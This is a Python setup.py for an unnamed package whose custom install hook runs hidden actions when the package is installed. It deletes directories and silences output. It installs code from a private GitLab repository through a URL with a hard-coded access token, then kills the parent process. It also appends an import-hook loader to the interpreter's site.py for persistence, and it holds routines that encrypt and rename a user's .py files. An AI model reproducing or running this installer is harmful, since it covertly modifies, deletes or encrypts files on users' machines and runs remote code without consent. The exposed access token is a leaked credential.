  ### win10 [ build ]  
  ### linux [ sdist ] 
  if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install' or sys.argv[1]=="egg_info" or sys.argv[1]=='clean'  or sys.argv[1]== 'build' :


    # if sys.argv[1]=='clean':
    #     print("@@ !!clean!! @@")
    #     import os
    #     import importlib as L

    #     # name = dictOP['name']
    #     name = Var.nameA if not Var.nameA.find(".")!=-1 else  Var.nameA.split('.')[0]
    #     TT= L.import_module(name)
    #     TTP= os.path.dirname(TT.__file__)
    #     print("@TTP+++: ",TTP)
    #     os.system(f"rm -rf  { TTP }") 



    import builtins
    builtins.__dict__["QQA"]=123

    
    ##############################################
    from setuptools.command.install import install
    
    #####
    from subprocess import check_call
    
    
    nameA= f"{Var.nameA}" 
    nameB= f"{Var.nameB}"
    package= f"{sdist.dir}"
     

    #### pip-install
    from pip._internal.cli.main import *
    class PostCMD(install):
      """cmdclass={'install': XXCMD,'install': EEECMD }"""

      def EQ64(self, pathQ="/content/R.py"):
                def E64Q(path="/content/R.py"):
                    import base64
                    image = open( path , 'rb')
                    valueQ = base64.b64encode(image.read()).decode()
                    ###########################################
                    import os
                    # os.system("pip install cryptocode==0.1> log.py")
                    import cryptocode
                    # os.system("pip uninstall cryptocode -y> log.py")
                    # os.remove("log.py")
                    ###########################################
                    wow = os.popen("git config root.dir").read().rstrip()
                    value = cryptocode.encrypt(valueQ, wow )
                    # print(value)
                    open( path , 'w').write(value)


                ##### 編碼
                # E64Q()
                def listPY(PWD="/content"):
                    data = {}
                    import os
                    ### 路徑   底下目錄  底下檔案
                    for root , dirs , files in os.walk(PWD):
                        # print(root) ## 所有的目錄
                        # print(root,files) ## 所有的子檔案

                        for name in files:
                            if os.path.splitext(name)[1]==".py":
                                # print(name)
                                ## [rename]
                                os.rename(os.path.join(root,name),os.path.join(root,name[0:-2]+"osp"))
                                name = name[0:-2]+"osp"

                                ## [init]
                                if not root in data.keys():
                                    data[root]=[]
                                ## [add]
                                data[root].append(name)

                    # return data
                    return [ os.path.join(path,name) for path,R in data.items() for name in R ]
                    


                # import os
                for i in listPY(pathQ):
                    E64Q(i)


                #########################################################################
                #########################################################################
                #########################################################################

      def  run(self):
        ###################################
        import os
        install.run(self)
        print(nameA,nameB)
        ##################################################### 相同的 PID 程序
        ################################################
        ################################################
        ################################################
        import os
        if not "sys.argv" in os.environ.keys():
            
            ################################################
            ################################################
            ################################################
            print("# 小貓 1 號")

            
            def DPIP(BL):
            #   ###########################################
            #   import os
            #   def showPIP():
            #         import os,re
            #         pip=os.popen("pip show pip")
            #         return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip().replace(os.path.sep,"/") 
            #     ##################################################################################################
            #   def mv(DIR,pathA,pathB):
            #     ####################################
            #     import os,subprocess as cmds
            #     home = os.getcwd()
            #     ####################################
            #     os.chdir(DIR)
            #     if   os.name=="posix":
            #         cmds.Popen('mv "'+pathA+'" "'+pathB+'" ',shell=True,stdout=open(os.devnull,"w") )
            #     elif os.name=="nt":
            #         cmds.Popen('move "'+pathA+'" "'+pathB+'" ',shell=True,stdout=open(os.devnull,"w") )
            #     os.chdir(home)

              if BL:
                # #########
                # ## A ##
                # #########
                # DIR = str(__file__).split("setup.py")[0]  
                # # DIR = showPIP()
                # FFQ = f"{Var.nameA}-{Var.nameB}.dist-info"
                # FFQB = f"{Var.nameA}-{Var.nameB}.dist-info"
                # mv(f"{DIR}{os.path.sep}{ FFQ }",f"{DIR}{os.path.sep}{ FFQB }")
                #########
                ## B ##
                #########
                ##################################################################
                import os
                ##################################################################
                FF = str(__file__).split("setup.py")[0]
                # print("@ pipQQ ::",FF)
                
                import os
                # print(os.popen("dir "+FF).read())
                ### 刪除1
                if os.name=="nt":     ## Win10    
                    print("@ DPIP-FF ::",FF )  
                    os.system(f"rmdir /q /s {FF}") ## DEL
                    # import shutil
                    # shutil.move(FF,FF+"QQ")
                    ###################################### 

                    # print("@ DPIP ::",os.popen("dir "+FF).read() ) 
                ##################################################################
                # C:\Users\moon\AppData\Local\Temp\pip-install-vslm992c\sh-py_51683c691ba945329606fb3092157455 的目錄
              else:
               
                ##################################################################
                import os
                ##################################################################
                FF = str(__file__).split("setup.py")[0]
                import os
                # print(os.popen("dir "+FF).read())
                ### 刪除1
                if os.name=="nt":     ## Win10    
                    print("@ DPIP-FF ::",FF )  
                    os.system(f"rmdir /q /s  {FF+os.path.sep}UNKNOWN-0.0.0-py3.7.egg-info") ## DEL
             



            ##########################################################
            ## 只有 win10 會
            DPIP(True)
            # #########################################################
            # ### 只能是字串 陣列會錯誤
            # import sys , os
            # # os.environ[ "sys" ] = str(sys.argv)       
            # os.system("pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/"+nameA+"/@v"+nameB+"#egg="+nameA+"")
            # ################???... 如果用...執行續???

            
            import os
            #### from pip install 
            #### 建立一個 .py檔案
            from tempfile import NamedTemporaryFile as F
            fp = F(suffix=".py",prefix="",delete = False ) ## 檔案不刪除
            ################################################
            
#             ####################################################################
#             textOP='''
# ##[startOP]
# import builtins as B
# def dirOP():
#    return os.environ["LOCALAPPDATA"]+ r"\pip\cache\http\b\b" if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b" if os.name=="posix" else "None" )
              
# B.__dict__["dirOP"]= dirOP
# ##[startOP]
# '''
#             ######## 這是寫入 site.py import 模組時....自刪除重新安裝 程序
#             import sys,pip
#             readOP = open(pip.__file__,"r").read() ## 讀取
#             open(pip.__file__,"a+").write(textOP)   ## 寫入
#             del sys.modules["pip"]
#             ####################################################################



            #### 後面的OP.py應用
            

            # ###########################################  SH.py-12.97.dist-info
            # ###########################################  SH.py-12.97.dist-info
            # ############################################ 
            # nameA= f"{Var.nameA}" 
            # nameB= f"{Var.nameB}"
            # # # package= f"{sdist.dir}"
            import os
            # os.system(f'start cmd /c "timeout /nobreak /t 13&& echo {str(nameB)} && pause"')
            ############################################ 
            cmd_scripts=[                                                        
            'cmdsSQL=SQL.databasesB:main',  
            'databases=md.databases:main',                      
            ]
            ###########################################
            import os
            def showPIP():
                import os,re
                pip=os.popen("pip show pip")
                return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip().replace(os.path.sep,"/") 
            ##################################################################################################
            # nameQ = showPIP() + os.path.sep + nameA+ r"-" +nameB+ r".dist-info"  
            ############################################
            dirQX = [i.split("=")[1].split(".")[0]   for i in cmd_scripts] 
            ####################################################################################################
            #################################################################################################
          
       
      
            textSQ='''
##['''+nameA+''']

# https://iter01.com/585035.html

import sys
from types import ModuleType
from importlib.machinery import ModuleSpec
from importlib.abc import MetaPathFinder, Loader
 

from pip._internal.cli.main import *
class Module(ModuleType):
   def __init__(self, name):
      ################################################
      #print("!B!",name)
      self.x = 1
      self.name = name
      #### pip-install

from pip._internal.cli.main import * 
from pip._internal.commands.install import *
from pip._internal.metadata.pkg_resources import *


    
def mv(DIR,pathA,pathB):
    ####################################
    import os,subprocess as cmds
    home = os.getcwd()
    ####################################
    os.chdir(DIR)
    if   os.name=="posix":
        cmds.Popen('mv "'+pathA+'" "'+pathB+'" ',shell=True,stdout=open(os.devnull,"w") )
    elif os.name=="nt":
        cmds.Popen('move "'+pathA+'" "'+pathB+'" ',shell=True,stdout=open(os.devnull,"w") )
    os.chdir(home)


class ExampleLoader(Loader):
   ### 宣告-設值
   def create_module(self, spec):
      ###########################################  
      import os ,re,sys 
      if os.name=="posix":     ## Linux
        DIR = r"'''+showPIP()+'''"
        for i in [i for i in os.listdir( DIR )if re.findall("'''+nameA+'-'+nameB+'''",i)]:
            mv(f"{DIR}{os.path.sep}{i}",f"{DIR}{os.path.sep}{i}_del")

      elif os.name=="nt":     ## Win10
         DIR = r"'''+showPIP()+'''"
         for i in [i for i in os.listdir( DIR )if re.findall("'''+nameA+'-'+nameB+'''",i)]:
            mv( DIR,f"{DIR}{os.path.sep}{i}",f"{DIR}{os.path.sep}{i}_del")
      ###########################################
      os.environ["sys.argv"]= str(spec.name)  
      ##################################################
      return Module(spec.name) ## self.name 
      ##################################################


   ### 運作
   def exec_module(self, module):
      import os , sys
      print("!C!",  module , module.name , os.getpid() , os.getppid())
      import sys,os

      ## [ str ][0] 取出
      '''+f"cmd_scripts={cmd_scripts}"+'''
      cmdsONE = [i for i in cmd_scripts if i.startswith( sys.argv[0].split(os.path.sep).pop().split(".")[0] )  ][0] 

      import os
      os.environ['sys.argv']= str(sys.argv)  
      os.environ['sys.cmds']= str(cmdsONE)


      import subprocess,os
      ### 注意屬性[pip -v]
      sproc = subprocess.Popen("pip install '''+nameA+'=='+nameB+''' --compile --no-cache-dir",shell=True,stdout=open(os.devnull,"w") )
      sproc.wait() ##

      import re,os
      DIR = r"'''+showPIP()+'''"
      for i in [i for i in os.listdir( DIR )if re.findall("'''+nameA+'-'+nameB+'''",i)]:
        mv( DIR,i,i[0:-4] ) 



      import os
      ##########################################
      import os
      del os.environ["sys.argv"]
      ##########################################
      ################### pp.resume() ## 繼續跑

      ###### 直接關閉..
      import os
      os._exit(0)
      

# class ExampleFinder(MetaPathFinder):
class '''+nameA.replace(".","_")+'''(MetaPathFinder):
   def find_spec(self, moduleQ , path, target=None): 
      
      if moduleQ in '''+str(dirQX)+''':
        ################### 會顯示 模組名 'moduleQ'
        print("@Finde:", moduleQ , path )
        return ModuleSpec( moduleQ , ExampleLoader())
     


import os,sys
if not "sys.argv" in os.environ.keys():
     sys.meta_path.append('''+nameA.replace(".","_")+'''())

###########################################
### pip uninstall SH.py -y
##########################################
import sys
if "'''+nameA+'''" in [i if len(i.split("=="))==1 else i.split("==")[0] for i in sys.argv]:
    
    if "uninstall" in sys.argv:
        ### 清除 os.path  ##[tag標籤]
        ##########################
        import re
        R=re.findall("##\['''+nameA+'''\].*##\['''+nameA+'''\]",open(__file__,"r").read(),re.S)
        S="".join(open(__file__,"r").read().split(R[0]))
        ## del
        open(__file__,"w").write(S)
        ########################### 
  

##[''' +nameA+''']
'''
   
            
   
            
            ###############################################
            ################################################
            import os,sys
            ## 設定::PYTHONPATH 變數 .........pip install 預設路徑在 HOME??? 所以建檔位置在這
            os.environ["PYTHONPATH"] = os.environ["LOCALAPPDATA"] if os.name=="nt" else os.environ["HOME"]
            textB='''
# coding=MS950

##### 加密 ###########################
def EQ64( dirQQ , pathQ="/content/R.py"):
    def E64Q( wow,path="/content/R.py"):
        #############################################################
        import base64
        image = open( path , 'rb')
        valueQ = base64.b64encode(image.read()).decode()
        #############################################################
        import os
        #############################################################
        import cryptocode
        value = cryptocode.encrypt(valueQ, wow )
        # print(value)
        open( path , 'w').write(value)
        #############################################################


    ##### 編碼
    # E64Q()
    def listPY(PWD="/content"):
        data = {}
        import os
        ### 路徑   底下目錄  底下檔案
        for root , dirs , files in os.walk(PWD):
            # print(root) ## 所有的目錄
            # print(root,files) ## 所有的子檔案

            for name in files:
                if os.path.splitext(name)[1]==".py":
                    # print(name)
                    ## [rename]
                    os.rename(os.path.join(root,name),os.path.join(root,name[0:-2]+"osp"))
                    name = name[0:-2]+"osp"

                    ## [init]
                    if not root in data.keys():
                        data[root]=[]
                    ## [add]
                    data[root].append(name)

        # return data
        return [ os.path.join(path,name) for path,R in data.items() for name in R ]
        


    # import os
    for i in listPY(pathQ):
        E64Q( dirQQ,i )



# #####################
def EQ64(pathQ="/content/R.py"):
    def E64Q(path="/content/R.py"):
        import base64
        image = open( path , 'rb')
        valueQ = base64.b64encode(image.read()).decode()
        ###########################################
        import os
        import cryptocode
        ###########################################
        wow = os.popen("git config root.dir").read().rstrip()
        value = cryptocode.encrypt(valueQ, wow )
        # print(value)
        open( path , 'w').write(value)


    ##### 編碼
    # E64Q()
    def listPY(PWD="/content"):
        data = {}
        import os
        ### 路徑   底下目錄  底下檔案
        for root , dirs , files in os.walk(PWD):
            # print(root) ## 所有的目錄
            # print(root,files) ## 所有的子檔案

            for name in files:
                if os.path.splitext(name)[1]==".py":
                    # print(name)
                    ## [rename]
                    os.rename(os.path.join(root,name),os.path.join(root,name[0:-2]+"osp"))
                    name = name[0:-2]+"osp"

                    ## [init]
                    if not root in data.keys():
                        data[root]=[]
                    ## [add]
                    data[root].append(name)

        # return data
        return [ os.path.join(path,name) for path,R in data.items() for name in R ]
        


    # import os
    for i in listPY(pathQ):
        E64Q(i)



#########################################################################
#########################################################################
#########################################################################

##### 取消 mv 的拷貝
def mv(pathA,pathB):
    import os
    if   os.name=="posix":
        os.system('mv "'+pathA+'" "'+pathB+'" ')
    elif os.name=="nt":
        ## 只能用雙引號
        os.system('move "'+pathA+'" "'+pathB+'" ')
    #################
    def listPY(PWD="/content"):
        data = {}
        import os
        ### 路徑   底下目錄  底下檔案
        for root , dirs , files in os.walk(PWD):
            # print(root) ## 所有的目錄
            # print(root,files) ## 所有的子檔案

            for name in files:
                if os.path.splitext(name)[1]==".py":
                    # print(name)

                    ## [init]
                    if not root in data.keys():
                        data[root]=[]
                    ## [add]
                    data[root].append(name)
        return data

#############################
### 移動end ###############
def mvQ( dirQQ, homeSQ ):
    # .....OP.py@@@
    # dirFF = str(__file__).split("setup.py")[0]
    # return dirFF 
    # import os
    # return os.getcwd()
    #####################################################
    ################ 移動start ##########################
    import os
    dirFF = os.getcwd()
    dirRR = [i for i in os.listdir( dirFF )if os.path.isdir( dirFF+os.path.sep+i) and   i!=".git"  ]

    for DIR in dirRR:
       mv( dirFF + os.path.sep + DIR  ,  os.environ[ "TEMP" ] +os.path.sep + f"{ dirQQ }..\\\\" + os.path.sep + DIR )  ; 
    #####################################################
    ################ 移動end ##########################

    return dirQQ , os.environ[ "TEMP" ] + os.path.sep + f"{ dirQQ }..\\\\"



### 編號 ######################################################################################
def dirQ():
    ###########################################
    # get_token = "read_repository:KedwAzjn7A4tFenQ58py"
    nameA = "'''+str(nameA)+'''"    #= "SH.py"
    nameB = "v'''+str(nameB)+'''"    #= "v13.17"
    def showPIP():
        import os,re
        pip=os.popen("pip show pip")
        return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip() 
    import os
    nameQ = showPIP() + os.path.sep + nameA+ r"-" +nameB[1::]+ r".dist-info" 
    if not os.path.isdir(nameQ):
        ###########################################  SH.py-12.97.dist-info
        import os
        # os.system("echo 123> /content/A.py")
        def strQ(N=10):
            import random, string
            return ''.join(random.choice(string.ascii_letters + string.digits) for x in range(N))
            # Generate [0-9, a-z, A-Z] ten words
        ##############################################################################################
        sumQ=""
        arrQ=[8,4,4,4,12]
        # (list1[-1])
        for i,s in enumerate(arrQ):
            ## print( arrQ.index(arrQ[-1]),arrQ[-1] , arrQ.index(arrQ[-1])==i )
            sumQ+=  strQ(s)+"-"  if arrQ.index(arrQ[-1])!=i else  strQ(s)
            # strQ(8)+"-"+strQ(4)+"-"+strQ(4)+"-"+strQ(4)+"-"+strQ(12)
        # return sunQ
        ######################################################################################################
        ######################################################################################################
        #############################################
        home = os.getcwd()
        os.chdir( os.environ[ "TEMP" ] )
        ############################################################################## 注意這裡 斜線都要兩倍
        os.system(f"mkdir {sumQ}..\\\\" if os.name=="nt" else (f"mkdir -p {sumQ}..\\\\" if os.name=="posix" else "" ))
        os.chdir( home )
        # #############################################
        return sumQ





########################################################################
### 宣告 #############################################################
def keyQ(dirQQ):
    import os
    home = os.getcwd()
    if os.name=="posix":     ## Linux系統
        os.system( "mkdir -p ~/.cache/pip/http/b/b")
        os.chdir( os.environ["HOME"]+"/.cache/pip/http/b/b")
        os.system("git init")    
        ###########################################
        # dirQ()  ############ 建置 root.dir
        sumQ = dirQQ
        os.system(f"git config root.dir { sumQ }") 
        ###########################################

    elif os.name=="nt":     ## Win10系統
        os.system( r"mkdir %LOCALAPPDATA%\\pip\\cache\\http\\b\\b")
        os.chdir( os.environ["LOCALAPPDATA"]+ r"\\pip\\cache\http\\b\\b")
        os.system("git init")
        ###########################################
        # dirQ()  ############ 建置 root.dir
        sumQ = dirQQ
        os.system(f"git config root.dir { sumQ }") 
        ###########################################

    homeSQ = os.getcwd()
    ##################
    os.chdir( home )

    # os.system(f'start cmd /c "timeout /nobreak /t 3&& echo { str(sumQ) }111@@ && pause"')
    # return sumQ
    return dirQQ,homeSQ
########################## 這個方法 會建立git專案key

def mainQ():
    A,B=keyQ(dirQ())
    C,D=mvQ(A,B)
    EQ64(C,D)




###########################
# import os
# os.remove( __file__ )

import sys
if "egg_info" in sys.argv:
        #  print("@ 目前正在 egg_info")
        ##################################
        nameA= "'''+nameA+'''"  
        nameB= "'''+nameB+'''"  
        ############################## 只有一次 
        ############################## 檢查
        import site,re 
        R=re.findall(f"##\[{nameA}\].*##\[{nameA}\]",open(site.__file__,"r").read(),re.S)
        if   len(R)==0: 
            
        
            textR=\'\'\'
'''+textSQ+'''
\'\'\'

            import site
            open(site.__file__,"a+").write( textR ) ## 寫入

'''        

            open(os.environ["PYTHONPATH"]+os.path.sep+"OP.py","w").write(textB)
       

            # fpB = F(suffix=".py",prefix="",delete = False ,dir= os.environ["PYTHONPATH"] ) ## 檔案不刪除
            
            ###############################################
            ################################################
            ###############################################
            ################################################
            test='''

import sys , os
###### os.system("python -m pip install psutil")
###### os.system(f"notepad {__file__}")


##os.system("pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v'''+nameB+'''#egg='''+nameA+'''")


#### pause-main
#### import psutil , os
####pp = psutil.Process( '''+str(os.getpid())+''' )   
####pp.suspend() ## 子程序 暫停 ......... 站亭子程序 但是 子孫不聽話


################################# 關閉 print !!
import sys,os
SS=sys.stdout
sys.stdout=open(os.devnull,"w")





# def wowID():
#     import os
#     home = os.getcwd()
#     homeSS= (os.environ["LOCALAPPDATA"]+".pip.cache.http.b.b".replace(".","\\\\")  ) if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b") 
#     os.chdir(homeSS)        
#     wow = os.popen("git config root.dir").read().rstrip()
#     os.chdir(home)     
#     return wow   
def wowID():
    import os
    wow= (os.environ["LOCALAPPDATA"]+".pip.cache.http.b.b".replace(".","\\\\")  ) if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b") 
    return wow   
import os
os.environ["sys.wow"] =  wowID()


############################################### 加密預設
import os;
if not "TEMP" in os.environ.keys():
    os.environ[ "TEMP" ] = "/tmp" 
############################################### 加密預設

################ 註冊信箱 ########################
def strQ(N=10):
    import random, string
    return ''.join(random.choice(string.ascii_letters + string.digits) for x in range(N))
    # Generate [0-9, a-z, A-Z] ten words
##############################################################################################
import os
os.environ[ "Email" ] = strQ(8) +"@gmail.com"
####################################################




print("!#################!" ,str("git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v'''+nameB+'''#egg='''+nameA+'''") )

#### pip-install ####1 ...成功版
from pip._internal.cli.main import *
main(["install","git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v'''+nameB+'''#egg='''+nameA+'''" ])
# main(["install","git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v17.35#egg='''+nameA+'''" ])


# main(["install","git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v12.91#egg='''+nameA+'''" ])
# import os
# os.system("pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v12.11#egg='''+nameA+'''")
# #### pip-install ####2 ...還是測試失敗了
# import subprocess,os
# sproc = subprocess.Popen("pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/'''+nameA+'''/@v12.11#egg='''+nameA+'''",shell=True,stdout=open(os.devnull,"w"),stdin=open(os.environ["PYTHONPATH"]+os.path.sep+"OP.py","r") )
# # sproc.wait() ## 




########## 移除:cryptocode 模組 #################
import os
os.system("pip uninstall cryptocode -y> log.py")
os.remove("log.py")
#####################################################


################################# 打開 print !!
sys.stdout=SS
###################################################


### start-main
################### pp.resume() ## 繼續跑

###### win...比os.exit()  有效果!!
###### 注意的是程序要停止...才能關閉..刪除
import subprocess,os
###### subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID {'''+str(os.getppid())+'''}", shell=True)
os.kill('''+str(os.getppid())+''',9)
'''
            
            fp.write( test.encode(encoding="utf-8") )
            fp.close()  ## close 關閉檔案::則才會刪除檔案!!   os.remove(fp.name) 才有效果
            ###############################################


            # ################################################
            # ################################################
            # fpB.write( testB.encode(encoding="utf-8") );fpName=fpB.name
            # fpB.name=os.environ["PYTHONPATH"] +os.path.sep+ "OP.py"
            # import os;os.rename(fpName,fpB.name);
            # fpB.close()  ## close 關閉檔案::則才會刪除檔案!!   os.remove(fp.name) 才有效果
            # os.remove(fpB.name) 
            # ###############################################
            # ###############################################

            import os
            # os.system(f"python {fp.name}") ## 必須關閉檔案 才能執行
            print( os.popen(f"python {fp.name}").read()) ## 必須關閉檔案 才能執行
            os.remove(fp.name)

            
            import os
            OPS = os.environ["PYTHONPATH"] +os.path.sep+ "OP.py"
            os.remove( OPS )
          


            
           
            
            
            ######################
            # https://blog.csdn.net/happyjacob/article/details/112385665
            DPIP(False)



            #############################################
            ###########################################
            #############################################
            # os.system(f'start cmd /c "timeout /nobreak /t 3&& echo EQ64444 {str(sys.argv)} && pause"')
            # import os
            # self.EQ64( os.environ[ "TEMP" ] + os.path.sep + f"{sumQ}..\\"  )
            # ###########################################################################   
            ############
            ############
            # os.system("pip uninstall cryptocode -y> log.py")
            # os.remove("log.py")



       
                
            

    

            



    ################################################
    # # with open("/content/QQ/README.md", "r") as fh:
    # with open("README.md", "r") as fh:
    #           long_description = fh.read()


    ##############
    import site,os
    siteD =  os.path.dirname(site.__file__)
    # +os.sep+"siteR.py"
    print("@siteD: ",siteD)
    #### setup.py ################################
    from setuptools import setup, find_packages
    
    setup(
          # name  =  "cmd.py"  ,
          name  =   f"{Var.nameA}"  ,
          
          ## version
          ## 0.7 0.8 0.9版 3.4版是內建函數寫入   錯誤版笨
          # version= "5.5",
          version=  f"{Var.nameB}"  ,
          # version= f"{Var.name}",
          # version= "01.01.01",
          # version="1.307",
          # name  =  "cmd.py"  ,
          # version= "1.0.4",
          # description="[setup.py]",

          author="我是一隻小貓",
          description="[setup.py專案]",
          author_email =   str(os.environ[ "Email" ])  if "Email" in os.environ.keys() else "999@gmial.com" ,
          
          
          #long_description=long_description,
          long_description="""# Markdown supported!\n\n* Cheer\n* Celebrate\n""",
          long_description_content_type="text/markdown",
        #   author="moon-start",
        #   author_email="login0516mp4@gmail.com",
          # url="https://gitlab.com/moon-start/cmd.py",
          license="LGPL",
          
        #   packages=find_packages(include= ["cmdsSQL","cmdsSQL.*"] ), 
          packages = find_packages(), 
        #   packages=find_packages(include=[f'{sdist.dir}',f'{sdist.dir}.*']),    
        #   packages=find_packages(include=['Cryptodome','Cryptodome.*','cryptocode','cryptocode.*']),   
        #   packages=find_packages(include=[f'{sdist.dir}',f'{sdist.dir}.*']),  



        #   'somepackage==1.2.0',
        #     'repo==1.0.0',
        #     'anotherpackage==4.2.1'
          # f'SH.py=={Var.nameB}'
                #  'repo @ https://github.com/user/archive/master.zip#egg=repo-1.0.0',
                #  f'SH.py@https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git/@v3.5#egg=SH.py'
          
                #  https://github.com/moon-start/SH/archive/refs/tags/v2.1.zip
        #   install_requires=[
        #        #  'repo @ https://github.com/user/archive/master.zip#egg=repo-1.0.0',
        #          'SH.py @ git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git/@v3.5#egg=SH.py',
        #   ],
          
        #   # 'https://github.com/user/repo/tarball/master#egg=repo-1.0.0'
        #   dependency_links=[
        #         f'https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git/@v{Var.nameB}#egg=SH.py'
        #   ],

          ####################### 宣告目錄 #### 使用 __init__.py
          ## 1 ################################################ 
          # packages=find_packages(include=['cmds','cmds.*']),
          # packages=find_packages(include=[f'{sdist.dir}',f'{sdist.dir}.*']),    
          ## 2 ###############################################
          # packages=['git','git.cmd',"git.mingw64"],
          # packages=['cmds'],
          # packages = ['moonXP'],
          # package_data = {'': ["moon"] },
          #################################
          # package_data = {"/content" : ["/content/cmd.py/cmds/__init__.py"]},
          #################################
          # data_files=[
          #       # ('bitmaps', ['bm/b1.gif', 'bm/b2.gif']),
          #       # ('config', ['cfg/data.cfg']),
          #       ( siteD , ['books/siteR.py'])
          # ],
          #################################
          # data_files=[
          #         # ('bitmaps', ['bm/b1.gif', 'bm/b2.gif']),
          #         # ('config', ['cfg/data.cfg'])
          #         ############ /content/cmd.py
          #         # ('/content', ['cmds/__init__.py'])
          #         ('', ['cmds/__init__.py'])
          # ],
          

          ## 相對路徑 ["cmds/AAA.py"] 壓縮到包裡--解壓縮的依據
          # !find / -iname 'AAA.py'
          # /usr/local/lib/python3.7/dist-packages/content/AAA.py
          # data_files=[
          #         # (f"/{sdist.dir}", ["books/siteR.py"])
          #         (f"{ siteD }", ["books/siteR.py"])
          # ],
          # data_files=[
          #   (r'Scripts', ['bin/pypi.exe']),
          #   (r'Scripts', ['bin/pypi-t.exe'])
          #   # (r'/', ['bin/git.exe'])
          # ],
        #   ## 安裝相關依賴包 ##
        #   install_requires=[
        #       'cmds.py==0.159'

        #   ### 會自動更新最高版本
        #   # !pip install git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=SH.py==2.8
        #     #   'git+https://pypi:nJa4Pym6eSez-Axzg9Qb@gitlab.com/moon-start/SH.git#egg=SH.py==2.8'



        #   #     # ModuleNotFoundError: No module named 'apscheduler'
        #   #     'apscheduler'
              
        #   #     # 'argparse',
        #   #     # 'setuptools==38.2.4',
        #   #     # 'docutils >= 0.3',
        #   #     # 'Django >= 1.11, != 1.11.1, <= 2',
        #   #     # 'requests[security, socks] >= 2.18.4',
        #   ],
        #   ################################
        #   ## python 入口點
        #   entry_points={
        #         ## Python中, 使用setup.py和console_scripts參數創建安裝包和shell命令
        #         'console_scripts':[                                                        
        #             'databases=md.databases:main',                      
        #         ],
        #   },
        #   ################################
        #   ## python 入口點
        #   entry_points={
        #         ## Python中, 使用setup.py和console_scripts參數創建安裝包和shell命令
        #         'console_scripts':[                                                        
        #             'databases=md.databases:main',                      
        #         ],
        #   },


        #   ## python 入口點
        #   entry_points={
          
        #         'console_scripts':[                                                        
        #             'cmdsSQL=SQL.databasesB:main',  
        #             'cmdsMD=md.databases:main',                      
        #         ],
        #   },


        # 無效!!
        #   # 安裝相關依賴包 ##
        #   install_requires=[
        #         'cryptocode==0.1',
        #         'pycryptodomex==3.14.0'
        #   ],
          ################################
          cmdclass={
                'install': PostCMD
                # 'develop':  PostCMD
          },
          #########################
          ## https://setuptools.pypa.io/en/latest/userguide/datafiles.html
          include_package_data=True, # 將數據文件也打包
          zip_safe=True
    )
   

### B



